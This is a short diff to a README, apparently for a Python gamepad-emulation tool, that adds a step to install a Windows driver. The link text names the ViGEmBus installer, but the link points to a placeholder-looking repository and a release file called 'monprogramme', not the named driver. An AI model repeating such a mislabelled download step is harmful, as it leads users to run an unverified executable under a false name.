@@ -29,7 +29,8 @@ The `config.json` file allows you to customize the following settings:
 
 ## 🚀 Installation
 
-Install the necessary dependencies with pip:
+1. Install the Windows driver [ViGEmBus_1.22.0_x64_x86_arm64.exe](https://github.com/ton-utilisateur/ton-projet/releases/download/v1.0/monprogramme).
+2. Install the necessary dependencies with pip:
 
 ```bash
 pip install pynput pywin32 psutil vgamepad
